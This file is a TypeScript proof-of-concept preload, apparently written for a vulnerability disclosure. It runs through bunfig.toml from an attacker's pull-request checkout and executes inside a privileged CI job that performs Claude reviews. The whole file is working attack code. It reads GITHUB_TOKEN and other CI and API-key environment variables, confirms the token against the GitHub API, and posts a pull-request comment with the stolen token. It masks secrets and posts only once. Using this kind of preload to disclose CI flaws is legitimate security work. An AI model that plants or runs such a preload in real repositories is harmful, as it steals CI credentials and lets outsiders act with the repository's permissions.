// PoC preload loaded by bun via ./bunfig.toml when the trusted workflow
// runs `bun run <script>` from the attacker-controlled PR checkout.
//
// Demonstrates RCE inside the privileged claude-review-comment job by:
//   1) reading GITHUB_TOKEN + workflow env from process.env
//   2) posting a PR comment via GH API using the stolen token (proves the
//      token is live and the job has pull-requests: write permission)
//   3) mirroring the dump to the run step summary as a backup proof

import { appendFileSync, writeFileSync } from "node:fs";

const token = process.env.GITHUB_TOKEN ?? "";
const repo = process.env.GITHUB_REPOSITORY ?? "";
const actor = process.env.GITHUB_ACTOR ?? "";
const runId = process.env.GITHUB_RUN_ID ?? "";
const workflow = process.env.GITHUB_WORKFLOW ?? "";
const jobName = process.env.GITHUB_JOB ?? "";
const prNumber = process.env.PR_NUMBER ?? "";
const summaryPath = process.env.GITHUB_STEP_SUMMARY;

const mask = (t: string) =>
  t.length < 12 ? "(empty)" : `${t.slice(0, 6)}…${t.slice(-4)} (len=${t.length})`;

const interestingKeys = Object.keys(process.env)
  .filter((k) =>
    /^(GITHUB_|RUNNER_|ACTIONS_|CI$|CLAUDE|ANTHROPIC|NPM|NODE_AUTH|WORKFLOW_PAT)/.test(k),
  )
  .sort();

const envLines = interestingKeys
  .map((k) => {
    const v = process.env[k] ?? "";
    const secretish = /TOKEN|KEY|SECRET|PAT|PASSWORD/i.test(k);
    return `- \`${k}\` = ${secretish ? mask(v) : v}`;
  })
  .join("\n");

async function tokenProof(): Promise<string> {
  if (!token) return "_(no token in env)_";
  try {
    const res = await fetch(`https://api.github.com/repos/${repo}`, {
      headers: {
        authorization: `token ${token}`,
        accept: "application/vnd.github+json",
        "user-agent": "poc-preload",
      },
    });
    const body = await res.text();
    return [
      `HTTP ${res.status} on \`GET /repos/${repo}\``,
      `\`x-oauth-scopes\`: \`${res.headers.get("x-oauth-scopes") ?? "(none)"}\``,
      `\`x-accepted-github-permissions\`: \`${res.headers.get("x-accepted-github-permissions") ?? "(none)"}\``,
      "",
      "```json",
      body.slice(0, 500),
      "```",
    ].join("\n");
  } catch (e) {
    return `_fetch error: ${(e as Error).message}_`;
  }
}

const proof = await tokenProof();

const md = `## PoC: RCE via \`bunfig.toml\` preload in attacker PR checkout

**Workflow:** \`${workflow}\` / job \`${jobName}\` / run \`${runId}\`
**Repo:** \`${repo}\`  **Actor:** \`${actor}\`  **PR:** #${prNumber}

### Stolen \`GITHUB_TOKEN\`
\`${mask(token)}\`

### Proof the token is live
${proof}

### Privileged env seen by preload
${envLines || "_(none)_"}

---
_Source: \`./.ci/setup.ts\`, loaded via \`./bunfig.toml\` from the attacker-
controlled PR head. Runs in-process before the trusted workflow script
(\`bun run /tmp/post-review.ts\`) because \`bun run\` is invoked with cwd set
to the attacker checkout._
`;

// 1) Mirror to run step summary.
if (summaryPath) {
  try {
    appendFileSync(summaryPath, md);
  } catch {}
}

// 2) Drop a local file for artifact capture.
try {
  writeFileSync("/tmp/poc-proof.md", md);
} catch {}

// 3) Post a PR comment using the stolen token as undeniable public proof.
//    Only attempt once per job to avoid spam: marker file in /tmp.
const marker = "/tmp/.poc-commented";
let alreadyPosted = false;
try {
  const fs = await import("node:fs");
  alreadyPosted = fs.existsSync(marker);
} catch {}

if (token && repo && prNumber && !alreadyPosted) {
  try {
    const body = {
      body:
        "<!-- poc-rce-preload -->\n" +
        "> **PoC:** this comment was posted by the `bunfig.toml` preload " +
        "running inside the privileged Claude review job, using the job's " +
        "`GITHUB_TOKEN`. An external PR author should not be able to post " +
        "as `github-actions[bot]`.\n\n" +
        md,
    };
    const res = await fetch(
      `https://api.github.com/repos/${repo}/issues/${prNumber}/comments`,
      {
        method: "POST",
        headers: {
          authorization: `token ${token}`,
          accept: "application/vnd.github+json",
          "content-type": "application/json",
          "user-agent": "poc-preload",
        },
        body: JSON.stringify(body),
      },
    );
    console.log(`::notice title=PoC comment post::HTTP ${res.status}`);
    if (res.ok) {
      try {
        const { writeFileSync: wfs } = await import("node:fs");
        wfs(marker, "done");
      } catch {}
    }
  } catch (e) {
    console.log(`::warning title=PoC comment error::${(e as Error).message}`);
  }
}

console.log(
  "::notice title=PoC preload fired::bunfig.toml preload executed — see job summary / PR comment",
);
